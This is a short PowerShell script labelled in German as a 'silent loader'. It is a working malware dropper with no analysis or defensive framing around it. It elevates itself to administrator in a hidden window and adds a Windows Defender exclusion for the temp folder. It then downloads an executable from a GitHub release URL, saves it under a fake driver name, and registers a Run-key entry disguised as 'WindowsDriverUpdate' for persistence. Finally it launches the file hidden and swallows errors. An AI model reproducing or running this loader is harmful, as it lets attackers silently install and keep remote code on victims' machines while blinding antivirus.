# xeron - Optimierter Silent Loader
$tempPath = $env:TEMP
$exePath = "$tempPath\sys_driver.exe"
$url = "https://github.com/LianMtown-cmyk/FSTALK/releases/download/main3/ilver.exe"

# 1. Admin-Check & Selbsterhöhung
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`Detailed"" -Verb RunAs
    exit
}

# 2. SOFORT den Defender-Ausschluss setzen (BEVOR der Download startet)
Add-MpPreference -ExclusionPath $tempPath -ErrorAction SilentlyContinue

# 3. Download & Persistenz
try {
    iwr -Uri $url -OutFile $exePath
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    if (-not (Get-ItemProperty -Path $regPath -Name "WindowsDriverUpdate" -ErrorAction SilentlyContinue)) {
        New-ItemProperty -Path $regPath -Name "WindowsDriverUpdate" -Value $exePath -PropertyType String
    }
    # 4. Starten
    Start-Process -FilePath $exePath -WindowStyle Hidden
} catch {
    # Fehler unterdrücken
}